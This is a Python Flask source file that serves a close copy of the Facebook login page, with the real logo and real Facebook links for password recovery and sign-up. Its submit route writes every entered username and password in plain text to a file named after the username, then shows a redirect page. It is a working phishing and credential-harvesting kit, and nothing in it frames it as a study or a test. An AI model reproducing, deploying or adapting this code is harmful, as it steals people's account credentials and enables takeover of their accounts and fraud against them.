from flask import Flask, request, render_template_string, render_template, redirect, url_for
import os

app = Flask(__name__)

# Directory where user data will be saved
DATA_DIR = "user_data"

# Ensure the directory exists
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# HTML template for the login form
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
</head>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}

body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #0d0f12; /* Dark background */
}

.container {
    width: 100%;
    max-width: 400px;
    padding: 20px;
    text-align: center;
    color: #aaa;
}

.language {
    font-size: 14px;
    color: #ccc;
    margin-bottom: 20px;
}

.logo img {
    width: 50px;
    margin-bottom: 20px;
}

.login-form {
    display: flex;
    flex-direction: column;
}

.login-form input {
    padding: 12px;
    margin: 8px 0;
    border: 1px solid #333;
    border-radius: 6px;
    background-color: #222;
    color: #fff;
}

.login-form input::placeholder {
    color: #888;
}

.login-form button {
    padding: 12px;
    margin-top: 10px;
    background-color: #1877f2;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    cursor: pointer;
}

.forgot-password {
    display: block;
    margin-top: 12px;
    color: #b3b3b3;
    font-size: 14px;
    text-decoration: none;
}

.forgot-password:hover {
    text-decoration: underline;
}

.create-account {
    margin-top: 20px;
    padding: 12px;
    width: 100%;
    background-color: transparent;
    color: #1877f2;
    border: 1px solid #1877f2;
    border-radius: 6px;
    font-size: 16px;
    cursor: pointer;
}

footer {
    margin-top: 40px;
    color: #777;
    font-size: 12px;
}

.footer-links {
    display: flex;
    justify-content: center;
    margin-top: 8px;
}

.footer-links a {
    color: #777;
    text-decoration: none;
    margin: 0 10px;
}

.footer-links a:hover {
    text-decoration: underline;
}

/* Mobile Responsiveness */
@media (max-width: 768px) {
    .container {
        max-width: 90%;
        padding: 15px;
    }

    .logo img {
        width: 40px;
    }

    .login-form input {
        padding: 10px;
    }

    .login-form button {
        padding: 10px;
        font-size: 14px;
    }

    .create-account {
        padding: 10px;
        font-size: 14px;
    }

    footer {
        font-size: 10px;
    }

    .footer-links a {
        font-size: 10px;
    }
}

@media (max-width: 480px) {
    body {
        padding: 10px;
    }

    .container {
        max-width: 100%;
        padding: 10px;
    }

    .login-form input {
        padding: 8px;
    }

    .login-form button {
        padding: 8px;
        font-size: 12px;
    }

    .create-account {
        padding: 8px;
        font-size: 12px;
    }

    footer {
        margin-top: 20px;
        font-size: 8px;
    }

    .footer-links a {
        font-size: 8px;
        margin: 0 5px;
    }
}

</style>
<body>
    <div class="container">
        <p class="language">English (US)</p>
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
        <form class="login-form" method="POST" action="/submit">
            <input type="text" name="username" placeholder="Mobile number or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
            <a href="https://en-gb.facebook.com/login/identify/?ctx=recover" class="forgot-password">Forgot password?</a>
        </form>
        <a href="https://www.facebook.com/r.php/"><button class="create-account">Create new account</button></a>
        <footer>
            <p>Meta</p>
            <div class="footer-links">
                <a href="#">About</a>
                <a href="#">Help</a>
                <a href="#">More</a>
            </div>
        </footer>
    </div>
</body>
</html>
"""

# Route to display the login form
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

# Route to handle form submission
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Save the username and password to a file
    with open(os.path.join(DATA_DIR, f"{username}.txt"), 'w') as file:
        file.write(f"Username: {username}\nPassword: {password}")

    # Redirect to the redirection.html page
    return render_template('redirection.html')

if __name__ == '__main__':
    app.run(debug=True)
